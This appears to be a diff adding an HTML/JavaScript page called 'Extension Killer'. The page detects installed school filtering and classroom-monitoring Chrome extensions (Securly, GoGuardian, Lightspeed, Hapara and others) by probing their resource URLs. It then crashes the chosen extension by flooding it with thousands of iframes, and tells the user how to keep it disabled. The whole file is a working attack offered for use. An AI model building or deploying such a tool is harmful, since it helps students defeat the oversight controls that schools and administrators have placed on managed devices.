@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Extension Killer</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Geist+Mono:wght@100..900&family=Geist:wght@100..900&display=swap');
+
+    :root {
+      --background: #1e1e2e;
+      --surface: #313244;
+      --overlay: #6c7086;
+      --text: #cdd6f4;
+      --subtext: #a6adc8;
+      --primary: #cba6f7;
+      --secondary: #89dceb;
+      --accent: #f5c2e7;
+      --red: #f38ba8;
+      --green: #a6e3a1;
+      --yellow: #f9e2af;
+      --blue: #89b4fa;
+      --lavender: #b4befe;
+      --rosewater: #f5e0dc;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Geist';
+    }
+
+    body {
+      background-color: var(--background);
+      color: var(--text);
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    header {
+      color: var(--text);
+      padding: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .header-content {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-icon {
+      font-size: 1.8rem;
+      margin-right: 1rem;
+      color: var(--primary);
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 2rem;
+      background-color: var(--surface);
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+    }
+
+    .info-text {
+      margin-bottom: 1.5rem;
+      line-height: 1.6;
+    }
+
+    .selection-area,
+    .slider-area {
+      margin-bottom: 1.5rem;
+    }
+
+    label {
+      display: block;
+      color: var(--subtext);
+    }
+
+    .dropdown {
+      width: 100%;
+      padding: 0.8rem;
+      font-size: 1rem;
+      border: 2px solid var(--overlay);
+      border-radius: 6px;
+      background-color: var(--background);
+      color: var(--text);
+      margin-bottom: 1rem;
+      outline: none;
+    }
+
+    .slider-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 1rem;
+      margin: 1rem;
+    }
+
+    input {
+      padding: 0.8rem;
+      font-size: 1rem;
+      border: 2px solid var(--overlay);
+      border-radius: 6px;
+      background-color: var(--background);
+      color: var(--text);
+      outline: none;
+    }
+
+    .resource-value {
+      min-width: 60px;
+      text-align: center;
+      font-weight: bold;
+      color: var(--lavender);
+    }
+
+    .button-area {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 2rem;
+    }
+
+    button {
+      font-size: 1rem;
+      padding: 0.8rem 1.5rem;
+      border: none;
+      border-radius: 6px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    #hangButton {
+      background-color: var(--blue);
+      color: var(--background);
+    }
+
+    #hangButton:hover {
+      background-color: var(--lavender);
+      transform: translateY(-2px);
+    }
+
+    #killButton {
+      background-color: var(--red);
+      color: var(--background);
+      display: none;
+    }
+
+    #killButton:hover {
+      background-color: #f7526f;
+      transform: translateY(-2px);
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(24, 24, 37, 0.9);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      flex-direction: column;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid rgba(203, 166, 247, 0.3);
+      border-radius: 50%;
+      border-top-color: var(--primary);
+      animation: spin 1s linear infinite;
+      margin-bottom: 1.5rem;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .status-message {
+      font-size: 1.2rem;
+      text-align: center;
+      color: var(--text);
+    }
+
+    #statusText {
+      margin-top: 1.5rem;
+      padding: 1rem;
+      background-color: var(--background);
+      border-radius: 8px;
+      border-left: 4px solid var(--green);
+      display: none;
+    }
+
+    footer {
+      background-color: var(--surface);
+      color: var(--subtext);
+      text-align: center;
+      padding: 1rem;
+      margin-top: auto;
+    }
+
+    footer a {
+      color: var(--blue);
+      text-decoration: none;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="header-content">
+      <i class="fas fa-sliders logo-icon"></i>
+      <h1>Extension Killer</h1>
+    </div>
+  </header>
+
+  <main>
+    <div class="container">
+      <p class="info-text">
+        Extension Killer kills extensions by spamming iframes with the extension's resources.
+      </p>
+
+      <div class="selection-area">
+        <label for="extensionSelect">Select extension to manage:</label>
+        <select id="extensionSelect" class="dropdown"></select>
+      </div>
+
+      <div class="slider-area">
+        <label for="resourceIntensity">
+          Adjust the number of iframe popups to generate below.
+        </label>
+        <div class="slider-container">
+          <input type="number" id="resourceIntensity" min="100" max="15000" value="2000" step="100">
+          <span id="resourceValue" class="resource-value">2000</span>
+        </div>
+      </div>
+
+      <div class="button-area">
+        <button id="hangButton" onclick="startProcess()"><i class="fas fa-pause-circle"></i> Suspend Extension</button>
+        <button id="killButton" onclick="finalizeProcess()"><i class="fas fa-power-off"></i> Finalize Process</button>
+      </div>
+
+      <div id="statusText"></div>
+    </div>
+  </main>
+
+  <div class="overlay" id="processingOverlay">
+    <div class="spinner"></div>
+    <p class="status-message">Processing... (This takes approximately 60 seconds)</p>
+  </div>
+
+  <script>
+
+    const extensions = {
+      "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
+      "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+      "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+      "Securly Classroom (2nd ID)": "chrome-extension://hkobaiihndnbfhbkmjjfbdimfbdcppdh/notfound.html",
+      "Securly Classroom (1st ID)": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+      "Hapara (2nd ID)": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+      "Hapara (1st ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
+      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
+      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
+      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
+      "classroom.cloud Student": "chrome-extension://mpkdoimpgkhjcicmhmlmgboelebflpla/_locales/lt/messages.json",
+      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
+      "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
+      "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
+      "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
+      "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
+    };
+
+    const intensitySlider = document.getElementById('resourceIntensity');
+    const intensityValue = document.getElementById('resourceValue');
+    const selectElement = document.getElementById('extensionSelect');
+    const overlay = document.getElementById('processingOverlay');
+    const killButton = document.getElementById('killButton');
+    const hangButton = document.getElementById('hangButton');
+    const statusText = document.getElementById('statusText');
+
+    intensitySlider.addEventListener('input', function () {
+      intensityValue.textContent = this.value;
+    });
+
+    async function populateExtensionDropdown() {
+      let foundExtensions = false;
+
+      for (const [name, url] of Object.entries(extensions)) {
+        try {
+          const response = await fetch(url);
+          if (response.ok) {
+            const option = document.createElement('option');
+            option.value = url;
+            option.textContent = name;
+            selectElement.appendChild(option);
+            foundExtensions = true;
+          }
+        } catch (error) {
+
+        }
+      }
+
+      if (!foundExtensions) {
+        const option = document.createElement('option');
+        option.value = '';
+        option.textContent = 'No supported extensions detected';
+        selectElement.appendChild(option);
+        hangButton.disabled = true;
+        hangButton.style.opacity = '0.5';
+      }
+    }
+
+    function createAndReplaceIframes(container, url, count) {
+      for (let i = 0; i < count; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        iframe.style.border = 'none';
+        iframe.style.position = 'absolute';
+        container.appendChild(iframe);
+      }
+
+      setTimeout(() => {
+        while (container.firstChild) {
+          container.removeChild(container.firstChild);
+        }
+        createAndReplaceIframes(container, url, count);
+      }, 5);
+    }
+
+    function startProcess() {
+      const selectedUrl = selectElement.value;
+      const selectedName = selectElement.options[selectElement.selectedIndex].text;
+      const resourceCount = parseInt(intensitySlider.value);
+
+      if (!selectedUrl) {
+        alert('Please select an extension first.');
+        return;
+      }
+
+      overlay.style.display = 'flex';
+
+      const popup = window.open('', 'ResourceManager', 'width=10,height=10,left=0,top=0');
+      if (!popup) {
+        alert('Popup blocked. Please allow popups for this site and try again.');
+        overlay.style.display = 'none';
+        return;
+      }
+
+      const container = popup.document.createElement('div');
+      popup.document.body.appendChild(container);
+
+      createAndReplaceIframes(container, selectedUrl, resourceCount);
+
+      setTimeout(() => {
+        popup.close();
+
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          hangButton.style.display = 'none';
+          selectElement.style.display = 'none';
+          document.querySelector('.selection-area label').style.display = 'none';
+          intensitySlider.style.display = 'none';
+          intensityValue.style.display = 'none';
+          document.querySelector('.slider-area label').style.display = 'none';
+
+          killButton.style.display = 'block';
+          killButton.setAttribute('data-url', selectedUrl);
+
+          statusText.style.display = 'block';
+          statusText.innerHTML = `Extension <strong>${selectedName}</strong> has been successfully suspended. Click the red button above to finalize the process.`;
+        }, 10000);
+      }, 5000);
+    }
+
+    function finalizeProcess() {
+      const selectedUrl = killButton.getAttribute('data-url');
+      const extensionId = selectedUrl.substring(
+        selectedUrl.indexOf('//') + 2,
+        selectedUrl.indexOf('/', selectedUrl.indexOf('//') + 2)
+      );
+
+      killButton.style.display = 'none';
+      statusText.innerHTML = `
+        Keep this tab open. Please open <strong>chrome:
+        and toggle "Allow access to file URLs" switch twice. The extension has been successfully managed! 
+        You can now close that tab as well as this one. To restore normal extension functionality, 
+        toggle the "Allow access to file URLs" switch again.
+      `;
+
+      window.location.href = selectedUrl;
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+
+      if (navigator.deviceMemory) {
+        const defaultIntensity = Math.min(Math.round(navigator.deviceMemory * 500), 15000);
+        intensitySlider.value = defaultIntensity;
+        intensityValue.textContent = defaultIntensity;
+      }
+
+      populateExtensionDropdown();
+    });
+
+    populateExtensionDropdown();
+  </script>
+</body>
+
+</html>
